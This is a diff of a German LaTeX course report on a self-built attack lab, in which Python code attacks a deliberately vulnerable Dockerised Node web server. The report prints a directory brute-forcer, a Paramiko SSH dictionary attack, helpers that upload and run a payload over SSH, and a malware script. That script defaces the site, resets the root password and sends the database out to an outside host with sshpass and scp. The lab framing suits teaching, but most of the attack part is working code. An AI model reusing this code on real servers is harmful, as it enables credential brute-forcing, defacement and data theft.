@@ -58,16 +58,16 @@ Anwendungen wie Webserver sind häufig der zentrale und angreifsbarste Teil eine
 Ziel dieses Projektes ist es die angreifbare Infrastrustur in Form des Webserver bereitzustellen und diesen anschließend anhand einer in Python programmierten Software anzugreifen.
 Der Angriff soll im ersten Schritt alle Inhalte des Opfer-Servers aufspüren und herunterladen. Anschließend sollten über den Browser alle Seiten automatisiert besucht und die Funktionalität genutzt werden.
 Des weiteren ist eine in der Infrastrustur bereitgestellte Schnittstelle wie SSH anhand eines Wörterbuch-Angriffs zu kompromitieren. Abschließend soll mit den erlangten Zugangsdaten eine Schadsoftware auf den Opfer-Server geladen werden, mit dieser ein defacement der gehosteten Webseite umgesetzt werden kann.\\
-Dieses Dokument beleuchtet die Umsetzung und Implementierung der einzelnen Schritte.
+Dieses Dokument beleuchtet die Umsetzung und Implementierung der einzelnen Schritte. 
 
 \newpage
 \section{Infrastrustur}
 \subsection{Opfer-Server}
 Der Opfer-Server soll ein Http-Server mit angreifbarer Webanwendung und Schnittstelle sein. Hierfür kommen etliche Frameworks und Distributionen wie Apache und xampp in Frage.
 Aufrund der Anforderungen habe ich mich für eine Node Anwendung in einem Docker Container entschieden.
-Container sind eine leichtgewichtige Art von Virtualisierung auf Betriebssystemebene. Dies kann genutzt werden um eine Anwendung mitsamt ihren Abhängigkeiten als eine abgeschlossene Einheit zu verpacken und zu betrieben. Dies bietet Vorteile wie Plattformunabhängigkeit und einfache Ausfürbarkeit. In diesem Fall wird ein node Web-Server mitsamt SSH Service aufgesetzt.\\
+Container sind eine leichtgewichtige Art von Virtualisierung auf Betriebssystemebene[1]. Dies kann genutzt werden um eine Anwendung mitsamt ihren Abhängigkeiten als eine abgeschlossene Einheit zu verpacken und zu betrieben. Dies bietet Vorteile wie Plattformunabhängigkeit und einfache Ausfürbarkeit. In diesem Fall wird ein node Web-Server mitsamt SSH Service aufgesetzt.\\
 Das Packet aus Anwendung und Abhängigkeiten
-nennt man auch Container-Image. Dies kann anhand des Dockerfiles erzeugt werden. Das Dockerfile enthält alle Instruktionen die zur Erstellung des Images benötigt werden.  \\
+nennt man auch Container-Image[2]. Dies kann anhand des Dockerfiles erzeugt werden. Das Dockerfile enthält alle Instruktionen die zur Erstellung des Images benötigt werden.  \\
 \begin{shaded}
 \begin{internallinenumbers}
 FROM ubuntu:latest
@@ -117,7 +117,7 @@ In Zeile 10 wird das root Passwort für die Schnittstelle des Webservers bzw. Co
 Mit \colorbox{mshadecolor}{\parbox{0.46\textwidth}{Docker build -t victim-http-server .}} wird aus dem Dockerfile ein Image erstellt. Alternativ kann das kompilierte Image auch über Dockerhub mit \colorbox{mshadecolor}{\parbox{0.58\textwidth}{Docker pull mauriceKalevra/ssh-node-server}} geladen werden. Dieses kann nun mit \colorbox{mshadecolor}{\parbox{0.51\textwidth}{Docker run -p 22:22 victim-http-server}} gestartet werden. Nun läuft der HTTP Server und die Webanwendung ist im Browser unter
 \colorbox{mshadecolor}{\parbox{0.20\textwidth}{173.17.0.2:1337}} einsehbar. Des weiteren ist eine Admin Schnittstelle über \colorbox{mshadecolor}{\parbox{0.26\textwidth}{ssh root@173.17.0.2}} erreichbar.
 \subsubsection{Webanwendung}
-Als Webanwendung dient ein Projekt aus einem früheren Semester. Dort war es Aufgabe eine Dynamische Webseite unter anderem mit einem NodeJs backend zu entwickeln. In der Anwendung 'Real-Estate Albsig' ist es möglich Immobilien Angebote zu Inserieren, suchen und einzusehen. Die Inserate und gesuche werden zudem auf dem Webserver in einer sqlite Datenbank gespeichert. Die Anwendung enthält mehrere Html/Css Dokumente, Ordner für Bilder, Javaskript Dateien und die Datenbank welche in einem Isolierten Verzeichniss liegt. Des weiteren exisitiert ein Dockerfile mit entsprechenden Konfigurationen.          
+Als Webanwendung dient ein Projekt aus einem früheren Semester[3]. Dort war es Aufgabe eine Dynamische Webseite unter anderem mit einem NodeJs backend zu entwickeln. In der Anwendung 'Real-Estate Albsig' ist es möglich Immobilien Angebote zu Inserieren, suchen und einzusehen. Die Inserate und gesuche werden zudem auf dem Webserver in einer sqlite Datenbank gespeichert. Die Anwendung enthält mehrere Html/Css Dokumente, Ordner für Bilder, Javaskript Dateien und die Datenbank welche in einem Isolierten Verzeichniss liegt. Des weiteren exisitiert ein Dockerfile mit entsprechenden Konfigurationen.          
 \newpage
 \section{Angriffe auf den Opfer-Server}
 \subsection{Spider-Angriff}
@@ -186,7 +186,7 @@ def mygobuster(self,target):
 \end{figure}
 
 Hierbei wird in Zeile 2 eine Wörterliste mit üblichen Nodejs-Verzeichnis und Dateinamen anhand einer List Comprehension eingelesen und entsprechend formatiert.
-In der Liste 'filters' befinden sich Dateiendungen nach denen gesucht werden soll. Nun wird über beide Listen iteriert und diese mit der url des Opfer-Servers verknüpft(vgl. Zeile 7) und dem Modul request übergeben(vgl. Zeile 8). Mit diesem ist es möglich Http Funktionalitäten zu nutzen. So wird ein Http request an den Opfer-Server geschickt und der Response code ausgelesen(vgl. Zeile 10). Gibt der Webserver den Statuscode 301 zurück, so heißt dies dass die gefunde Resource ein Verzeichnis darstellt. Der Pfad wird ausgegeben und der Variable 'newurl' zugewiesen. Anschließend wird in Zeile 14 die Funktion rekursiv aufgerufen um nach tieferen Verzeichnissen zu suchen. Lautet der Statuscode 200, handelt es sich um eine gefunde Datei wie Html, Css oder Javascript. Auch hier wird der Pfad ausgegeben und zudem entsprechend
+In der Liste 'filters' befinden sich Dateiendungen nach denen gesucht werden soll. Nun wird über beide Listen iteriert und diese mit der url des Opfer-Servers verknüpft(vgl. Zeile 7) und dem Modul request übergeben(vgl. Zeile 8). Mit diesem ist es möglich Http Funktionalitäten zu nutzen. So wird ein Http request an den Opfer-Server geschickt und der Response code ausgelesen(vgl. Zeile 10). Gibt der Webserver den Statuscode 301 zurück, so heißt dies dass die gefunde Resource ein Verzeichnis darstellt[4]. Der Pfad wird ausgegeben und der Variable 'newurl' zugewiesen. Anschließend wird in Zeile 14 die Funktion rekursiv aufgerufen um nach tieferen Verzeichnissen zu suchen. Lautet der Statuscode 200, handelt es sich um eine gefunde Datei wie Html, Css oder Javascript[5]. Auch hier wird der Pfad ausgegeben und zudem entsprechend
  der Dateiendung in eine Datei geschrieben(vgl. Zeile 20). Ab Zeile 21 wird zudem in einem try-except Block der Fall abgefangen das ein binary File gefunden wird.  
 Die Funktion ist in der Lage ein großteil der Dateien und Verzeichnisse zu finden. 
 
@@ -286,28 +286,145 @@ Die Webanwendung wird über eine SSH Schnittstelle gewartet. Nun  wird versucht 
 					attackssh("172.17.0.2")
 				 										Figure 5: SSH-Attack
  \end{lstlisting}
-Anfangs wird eine que angelegt, die in einer Exception befüllt wird(vgl. Zeile 28). Die Funktion wird anschließend erneut aufgerufen und es wird überprüft ob die que leer ist. \newpage Nun wird die Paramiko Biblothek aufgerufen(vgl. Zeile 8). Diese bietet SSH Implementierungen für client und serverseitige Funktionalitäten. Ab Zeile 11 wird Username und Passwort aus der que ausgelesen und entsprechen formatiert. Nun wird versucht eine Verbindung mit den übergebenen Anmeldedaten herzustellen(vglt. Zeile 14). Ist die verbidnung erfolgreich, werden Nutzername und Passwort ausgegeben(vgl. Zeile 16) und in die Datei 'cred.txt' geschrieben. Im gleichen Schleifendurchlauf werden zudem exceptions abgefangen. Die Funktion findet das Passwort und gibt es aus.\\
+Anfangs wird eine que angelegt, die in einer Exception befüllt wird(vgl. Zeile 28). Die Funktion wird anschließend erneut aufgerufen und es wird überprüft ob die que leer ist. \newpage Nun wird die Paramiko Biblothek aufgerufen(vgl. Zeile 8). Diese bietet SSH Implementierungen für client und serverseitige Funktionalitäten[6]. Ab Zeile 11 wird Username und Passwort aus der que ausgelesen und entsprechen formatiert. Nun wird versucht eine Verbindung mit den übergebenen Anmeldedaten herzustellen(vglt. Zeile 14). Ist die verbidnung erfolgreich, werden Nutzername und Passwort ausgegeben(vgl. Zeile 16) und in die Datei 'cred.txt' geschrieben. Im gleichen Schleifendurchlauf werden zudem exceptions abgefangen. Die Funktion findet das Passwort und gibt es aus.\\
 
 \begin{center}
 \includegraphics[scale=0.5]{data/success.png}
 \end{center}
 \subsection{Schadsoftware}
-Nun soll über die erlangten Zugangsdaten eine Schadware auf den Opfer Server geladen werden. Dort soll ein Defacement der Seite umgesetzt und zudem die Zugangsdaten der Schnittstelle geändert werden. Des weiteren sollen von außen nicht zugängliche Dokumente auf ein anderen remote Server geladen werden.
-
-\newpage
+Nun soll über die erlangten Zugangsdaten eine Schadware auf den Opfer Server geladen werden. Dort soll ein Defacement der Seite umgesetzt und zudem die Zugangsdaten der Schnittstelle geändert werden.\\
+Des weiteren sollen von außen nicht zugängliche Dokumente auf ein anderen remote Server geladen werden. Für das Hochladen Schadware werden erst einige Hilfsfunktion implementiert.\\
 Die Funktion 'getCredentials' ließt die Zugangsdaten aus der Datei 'cred.txt' aus und formatiert diese entsprechend.
 \begin{figure}[h]
- \caption{getCredentials}
- \begin{lstlisting}[language=python, style=code]
+\caption{Hilfsfunktion getCredentials}
+\begin{lstlisting}[language=python, style=code]
 def getCredentials():
- 	#hole gefunde credentials aus datei
- 	cred = open('cred.txt','r').readlines()
- 	#case zu string
- 	cred_string = cred[0].split()
- 	#lese username und passwort aus
- 	user = cred_string[0]
- 	pw = cred_string[1]
- \end{lstlisting}
+	#hole gefunde credentials aus datei
+	cred = open('cred.txt','r').readlines()
+	#case zu string
+	cred_string = cred[0].split()
+	#lese username und passwort aus
+	user = cred_string[0]
+	pw = cred_string[1]
+\end{lstlisting}
 \end{figure}
+\newpage
+Das Hochladen der Schadware wird mit einer weitern Hilfsfunktion realsiert.
+\begin{figure}[h]
+\caption{Hilfsfunktion sendMalware}
+\begin{lstlisting}[language=python, style=code]
+#send file to remote host
+def sendMalware():
+	getCredentials()
+	print("Sending SW.py to victim....")
+	ostring = "sshpass -p " + pw +  " scp -o StrictHostKeyChecking=no SW.py "+ user+"@172.17.0.2:/root"
+os.system(ostring)
+\end{lstlisting}
+\end{figure}
+Hierbei wirdmit dem Linux programm scp und sshpass gearbeitet.
+In Zeile 5 wird ein string für zusammengesetzt der anschließend mit der python Funktion os.system ausgeführt werden kann[7]. 
+\vspace{5mm}
+
+Die eigentliche Schadware arbeitet nun wie folgt. Das Defacement der Website wird umgesetzt indem eine neue Datei 'index.html' erzeugt und mit Html Code befüfflt wird. Hierfür muss zuerst der Pfad der legitimen Datei gefunden werden. In Zeile 4 wird mit subprocess das linux tool 'find' verwendet, um nach html dateien zu suchen.  
+\begin{figure}[h]
+ \caption{Erster Ansatz Schadware}
+ \begin{lstlisting}[language=python, style=code,basicstyle=\scriptsize]
+ import os
+ import subprocess
+ #suche mit linux-find, pfade mit der file endung html
+ proc = subprocess.Popen("find / -name '*.html'", shell=True, stdout=subprocess.PIPE)
+ output = proc.stdout.readlines()
+ for i in output:
+	 if "/public/index.html" in str(i):
+		 foundpath = i
+		 else:
+			 continue
+			 #defacement der website
+			 malware = open(foundpath,"w+")
+			 malware.write("<!DOCTYPE html><html><head><title>foobar</title><style>h1 {text-align: center;color: red</style></head><body><h1>You have been compromised</h1></body></html>")
+				 
+				 #change-cred
+				 subprocess.run('echo -n "pwned\npwned" | passwd root', shell=True)
+				 os.system("sshpass -p Pw scp -o StrictHostKeyChecking=no pfad sleven@192.46.236.95:/home/sleven")
+ \end{lstlisting}
+
+\end{figure}
+\newpage
+In den gefundenen Dateien wird nun nach der Haupt index Datei gesucht(vgl. Zeile 7). Es ist bekannt das Nodejs ein Verzeichnis namens 'public' besitzt, indem die Html dateien gehosted werden. Der Pfad wird in die Variable 'foundpath' geschrieben. Diese wird in Zeile 12 übergeben um die legitime index.html zu überschreiben. In die neue Html Datei wird nun in Zeile 13 das Defacement geschrieben.\\
+Anschließend werden in Zeile 16 die Anmeldedaten geändert. Hierbei werden erneut mit subprocess Linux befehle ausgeführt. Mit echo werden die neuen Anmeldedaten in passwd gepiped.\\
+In Zeile 17 wird nun die von außen nicht erreichbare Datei 'Immobilie.db' an ein weiteren Remote Server geschickt. Dies wird erneut mit os.system bewerkstelligt.
+
+Nachdem die Malware auf den Opfer-Server gesendet wurde, wird sie nun von der Funktion 'ExecMalware' ausgeführt.
+\begin{figure}[h]
+ \caption{Funktion zum ausführen der Schadware}
+ \begin{lstlisting}[language=python, style=code,basicstyle=\scriptsize]
+ def ExecMalware():
+ 	getCredentials()
+ 	client = paramiko.SSHClient()
+ 	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+ 	client.connect('172.17.0.2', username=user, password=pw)
+ 	time.sleep(1)
+ 	stdin, stdout, stderr = client.exec_command('python3 SW.py')
+	for line in stdout:
+	 	print(line)
+	 	client.close()
+ \end{lstlisting}
+
+\end{figure}
+Mit hilfe von Paramiko wird eine SSH Verbindung aufgebaut(vgl. Zeile 5). Anschließend wird in Zeile 7 über stdin des remote Servers die Malware gestartet.
+\newpage
+\section{Ausführung}
+Die einzelnen Funktionen und Klassen werden nun zu einer Datei 'attack.py' zusammengeführt.
+
+\newpage
+\section{References}
+[1] Docker Engine overview, 20.06.2022, https://docs.docker.com/engine/
+
+\vspace{4mm}
+
+
+[2] Docker Hub, 18.06.2022, https://docs.docker.com/docker-hub/onboard-business/
+\vspace{4mm}
+
+[3] Web2-Anwendungen-2 Repository, 17.05.2022, https://github.com/mauriceKalevra/Web2-Projekt
+
+\vspace{4mm}
+
+[4] Mozilla dokumentation, 22.06.2022, https://developer.mozilla.org/en-US/docs/Web/HTTP/Status
+
+\vspace{4mm}
+
+[5] Mozilla dokumentation, 22.06.2022, https://developer.mozilla.org/en-US/docs/Web/HTTP/Status
+
+\vspace{4mm}
+
+[6] Paramiko, 16.05.2022, https://www.paramiko.org/
+
+\vspace{4mm}
+
+[7] Python dokumentation, 14.06.2022, https://docs.python.org/3.8/library/os.html\#os.system
+
+\vspace{4mm}
+
+\textbf{Weitere Quellen}\\
+Python-Hacking
+Studienbrief 3: Python-Hacks\\
+aus "Python Penetration Testing\\
+Autoren:\\
+Prof. Dr. Martin Rieger
+Patrick Eisoldt, M.Eng.
+David Schlichtenberger, M.Sc.
+Benjamin Welte, M.Eng.
+Christian Schneider, M.Eng.
+\vspace{4mm}
+
+Python Hacking
+Teil 1\\
+Autoren:
+Prof. Dr. Martin Rieger
+Patrick Eisoldt, M.Eng.
+David Schlichtenberger, M.Sc.
+Benjamin Welte, B.Eng.
+Christian Schneider, M.Eng
 
 \end{document}
